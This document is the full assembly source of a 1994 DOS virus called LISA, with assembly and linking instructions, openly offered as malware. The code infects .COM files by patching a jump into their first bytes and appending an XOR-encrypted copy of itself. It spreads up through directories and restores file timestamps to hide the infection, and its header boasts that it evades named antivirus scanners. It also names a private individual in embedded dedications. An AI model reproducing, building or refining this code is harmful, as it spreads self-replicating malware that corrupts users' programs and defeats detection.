; Virusname: LISA
; Origin: Sweden
; Author: Metal Militia
; Date: 24/12/1994
;
; This virus can't be found with any anti-virus program (of the below
; that is) SCAN/TB-SCAN/F-PROT/SOLOMON. This because of that it's totally
; new written.
;
; It's a non-resident, encrypted, .com infector that spread with the
; "dot-dot" method. No damage is made, and no message is shown, but
; inside the code you can find some love greetings to the flower in
; my heart, Lisa Olsson. This was written on the christmas eve, as a
; 'happy new year' greeting to her, then especially for '94, but
; also for all other coming years.
;
; I may continue on thisone and make more and better versions.
; PS!, to tasm this virus, write: tasm /m3 lisa.asm, then just
; link it to a .com file by writing: tlink /t lisa.obj.


  Lisavirus segment
  Assume    CS:LisaVirus
  Org 100h                 ; account for PSP
  
  Start:  db      0e9h     ; jmp duh ; Jump to duh
          dw      0
  
  duh:    call next
  next:   pop     bp                   ; bp holds current location
          sub     bp, offset next      ; calculate net change
          jmp     go_for_it

   go_for_it:
    call encrypt_decrypt ; encrypt/decrypt it..

    jmp restore ; jump to the real "start".

write_virus:
    mov word ptr [bp+crypt_val],30h ; Here we use the enc_value
    call encrypt_decrypt ; call encrypt/decrypt
          mov     cx, eov - duh ; Write the virus
          lea     dx, [bp+duh]
          mov     ah, 40h
          int     21h
    call encrypt_decrypt ; call encrypt/decrypt (again, just like the text says)
    ret                  ; ret(urn) to the "caller"

crypt_val dw 0 ; encryption value

encrypt_decrypt:
    mov ax,word ptr [bp+crypt_val] ; the encrypt/decrypt rountine
    lea si,[bp+encrypt_start]
    mov cx,(eov-duh+1)/2
again:
    xor word ptr [si],ax ; XOR's kicking it :)
    inc si
    inc si
    loop again ; loop it all
    ret ; ret(urn) to caller

encrypt_start: ; start of encryption
restore:  
          lea     si, [bp+offset stuff] ; Restore the beginning
          mov     di, 100h              ; (see stuff, the buffer)
          push    di
          movsw
          movsb

          lea     dx, [bp+offset dta] ; Set the DTA
          call    set_dta
  
          mov     ah,47h ; Get the current directory (will be restored lateron)
          xor     dl,dl
          lea     si,[bp+eov+2ch]
          int     21h

  findfirst:
          mov     ah, 4eh           ; Find first
          lea     dx, [bp+masker]   ; search for '*.COM',0
  tryanother:
          int     21h
          jc      chdir             ; Quit on error
          
          mov     ax, 3D02h ; Open the file
          lea     dx, [bp+offset dta+30] ; File name is located in DTA
          int     21h
          xchg    ax, bx ; instead on mov bx,ax.. one byte saved :)
  
          mov     ax,5700h ; Take the file's time
          int     21h

          push    cx
          push    dx

          mov     cx, 3 ; Read in the first three bytes
          lea     dx, [bp+stuff]
          mov     ah, 3fh
          int     21h
                                                 ; Check if already infected
          mov     cx, word ptr [bp+stuff+1]      ; jmp location
          mov     ax, word ptr [bp+dta+26]
          add     cx, eov - duh + 3              ; convert to filesize
          cmp     ax, cx                         ; if same, already infected
          jz      close                          ; so quit out of here
  
          sub     ax, 3                          ; ax = filesize - 3
          mov     word ptr [bp+writebuffer], ax
  
          xor     al, al ; Go to the beginning
          call    f_ptr
  
          mov     cx, 3 ; Write three bytes
          lea     dx, [bp+e9]
          mov     ah, 40h
          int     21h

          mov     al, 2 ; Go to the end
          call    f_ptr
  
         mov     ah,2ch
         int     21h

         mov     word ptr [bp+crypt_val],dx

    call write_virus
  
  close:
          pop     dx
          pop     cx

          mov     ax,5701h ; Restore the files time
          int     21h

          mov     ah, 3eh ; Close the file
          int     21h
  
  ; Try infecting another file
          mov     ah, 4fh                        ; Find next, try to infect
          jmp     short tryanother               ; another file.

  chdir:
          mov     ah,3bh ; Change up one dir
          lea     dx,[bp+offset newdir]
          int     21h
          jc      quit

          jmp     findfirst

  quit:
  real_quit:
          lea     dx,[bp+eov+2ch] ; Restore the DIR
          mov     ah,3bh
          int     21h

 fix_it:
          mov     dx, 80h                        ; Restore the DTA to the
                                                 ; default
  set_dta:
          mov     ah, 1ah                        ; Set the disk transfer
          int     21h                            ; address

  exit:
          retn                                    ; Return to org. program
  f_ptr:  mov     ah, 42h
          xor     cx, cx
          cwd                                    ; equal to xor dx,dx or the
          int     21h                            ; other style, sub dx,dx
          retn
  
          db      'love.girl.LISA.forever.666 ' ; 
          db      '(c) Metal Militia / Immortal Riot ' 
          db      'Sweden 24/12/93 ' ; the Date of finish, christmas eve
          db      'Thunderclouds pass the sky, dreams & thoughts '
          db      'goes thrue my mind.. winds of love, floods of '
          db      "hope, until the day, when you'll be mine!.... "
          db      'Dedicated to Lisa Olsson who will always be my passion '
          db      'my obsession and my infinite dream. All i ever wanted, '
          db      'all i ever asked for. Happy new year, yours Metal..... '

  newdir  db      '..',0 ; needed to move up one dir (dot-dot method)
  masker  db      '*.com',0 ; filetype to infect, .com-files
  greets  db      'Greets to Raver and The Unforgiven/IR' ; greets to my
                                                          ; friends
  stuff   db      0cdh, 20h, 0 ; original three bytes saved here
  e9      db      0e9h ; the jmp
  eov equ $                                      ; end of virus/encryption
  writebuffer dw  ?                              ; Scratch area for the JMP
                                                 ; offset holding.
  dta         db 42 dup (?)                      ; the DTA thingy (42 dup)
  LisaVirus    ENDS
               END     Start